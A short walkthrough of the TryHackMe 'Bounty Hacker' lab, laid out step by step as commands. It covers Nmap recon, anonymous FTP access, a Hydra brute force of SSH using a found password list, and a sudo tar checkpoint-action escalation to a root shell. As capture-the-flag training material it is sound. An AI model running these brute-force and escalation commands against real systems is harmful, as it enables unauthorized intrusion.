Bounty Hacker — Walkthrough

Target: TryHackMe — Bounty Hacker

Initial Recon

I started with a full Nmap scan to see what was exposed:

nmap -sC -sV -p- -T4 10.10.95.136

I also checked the website manually and intercepted traffic with Burp Suite, but nothing useful came up.

Nmap results showed:

  • 21/tcp — ftp — vsftpd 3.0.3
  • 22/tcp — ssh — OpenSSH 7.2p2 Ubuntu
  • 80/tcp — http — Apache 2.4.18

FTP Access

I tried logging into FTP anonymously and it worked:

ftp anonymous@10.10.95.136

Inside the FTP directory, I found two files: locks.txt and task.txt.

get locks.txt
get task.txt

locks.txt looked like a password list.

Brute Forcing SSH

I used Hydra to brute force the SSH login for the user lin:

hydra -l lin -P locks.txt ssh://10.10.95.136

Hydra successfully found the correct password.

User Flag

Once I logged in via SSH, I grabbed the user flag:

ssh lin@10.10.95.136
cat user.txt

Privilege Escalation

Then I checked what commands I could run with sudo:

sudo -l

The output showed that lin could run /bin/tar as root.

I used the classic tar exploit to escalate privileges:

sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
whoami

This popped a root shell.

Root Flag

cat /root/root.txt
